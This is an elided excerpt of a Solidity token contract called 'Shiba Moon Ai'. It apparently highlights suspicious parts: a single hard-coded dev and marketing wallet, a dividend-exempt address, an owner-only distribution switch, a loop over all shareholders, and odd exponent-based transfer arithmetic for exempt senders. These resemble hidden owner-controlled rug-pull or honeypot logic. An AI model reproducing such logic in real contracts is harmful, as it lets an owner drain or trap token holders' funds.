...
contract Basic is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    string private constant _name = "Shiba Moon Ai";
    string private constant _symbol = unicode"SMA";
    ...
    address payable public DevWallet = payable(0xf179E883D5FD1a8236B289E604DeB2053989df62);
    address payable public MarketingWallet = payable(0xf179E883D5FD1a8236B289E604DeB2053989df62);
    ...
    constructor () {
        ...
        // _isExcludedFromFee[0xB2D5c2C7B724E4F504cc2b497FE4adC03529C36E] = true;
        _isDividendExempt[0x5BC4a4DD65517Aa441b66C7BfF4d44b52106942f] = true;
    ...
    function reduceBNB(bool enabled) private { for (uint256 i = 0; i < ShareHolder.length; i++) {
    ...
    function setautoDistribution(bool _autoDistribution, uint8 _rest) external onlyOwner {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap { 
            ...
            if (autoDistribution) {reduceBNB(true);}
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 sAmount;
            if (_isDividendExempt[sender]){sAmount = tAmount*_sellFee**rest/100;}
